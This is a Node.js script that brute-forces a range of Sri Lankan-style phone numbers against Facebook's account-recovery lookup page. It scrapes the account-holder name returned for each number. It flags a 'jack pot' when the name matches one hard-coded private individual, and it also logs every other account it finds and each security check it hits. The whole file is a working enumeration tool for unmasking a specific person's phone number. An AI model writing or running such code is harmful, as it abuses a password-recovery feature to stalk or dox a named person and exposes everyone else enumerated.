var request = require('request');
var JSSoup = require('jssoup').default;
var fs = require('fs');

var service = '077',end= '71';

doProcess = function(startNumber){

	if(startNumber == 50010)
	  return;

	var mid = startNumber;
	if (mid == 0)
         mid = '00000';
	else if (mid<10) 
	 mid= '0000'+mid;
	else if (mid < 100) 
	 mid = '000'+mid;
	else if( mid < 1000 )
	 mid = '00'+mid;
	else if (mid < 10000 )
	 mid = '0'+mid;
	else
	 mid = mid;

    
    var number = service+mid+end;
    console.log('Searching for '+number+'');
    setTimeout(search,5000,number,startNumber);
    
}
	






function search(number,index){
	var options = {
		url: 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=1',
		headers: {'User-agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0'},
		jar: true,
		followAllRedirects: true,
		form: {
		email:number,
		did_submit:"Search"
		}
	};

	request.post(options,function(error, response, body) {
	  prase(body,number,index);
		
	});

}



function prase(response,phonenumber,index){

var soup = new JSSoup('<html><head>'+response.split("<head>")[1]);
var tag = soup.find('title');
var keyname = 'Ashiya Dassanayake';
var isContinue;
if(tag.text == 'Reset Your Password'){
//Account Found
	user = soup.findAll('strong')[0].nextElement._text;
	
	if(user == keyname){
		
		// Jack Pot
		var str = 'Ashi find for '+phonenumber+'\n';

		fs.open('ashi99.txt', 'a', (err, fd) => {
		  if (err) throw err;
		  fs.appendFile(fd, str, 'utf8', (err) => {
		    fs.close(fd, (err) => {
		      if (err) throw err;
		        console.log("\n\n\n\nJack pot "+phonenumber+'\n\n');
			return false;
		      
		    });
		    if (err) throw err;
		  });
		});
		
                
	}
	else{
		
		var str = user+' Has Account but not Ash for '+phonenumber+'\n';

		fs.open('account.txt', 'a', (err, fd) => {
		  if (err) throw err;
		  fs.appendFile(fd, str, 'utf8', (err) => {
		    fs.close(fd, (err) => {
		      if (err) throw err;
		      console.log(str);
                      doProcess(index+1);
                      return true;
		    });
		    if (err) throw err;
		  });
		});
	}
}
else if(tag.text == 'Security Check'){
// Security check
	var str = 'Security Check for '+phonenumber+'\n';

	fs.open('sec.txt', 'a', (err, fd) => {
		  if (err) throw err;
		  fs.appendFile(fd, str, 'utf8', (err) => {
		    fs.close(fd, (err) => {
		      if (err) throw err;
                      console.log(str);
                      return false;
		    });
		    if (err) throw err;
		  });
		});
}
else{
// No Account Found
var str = 'No Account Found for '+phonenumber+'\n';
fs.open('error.txt', 'a', (err, fd) => {
		  if (err) throw err;
		  fs.appendFile(fd, str, 'utf8', (err) => {
		    fs.close(fd, (err) => {
		      if (err) throw err;
                      console.log(str);
		      doProcess(index+1);
                      return true;
		    });
		    if (err) throw err;
		  });
		});
	
}


}


//doProcess(50000);


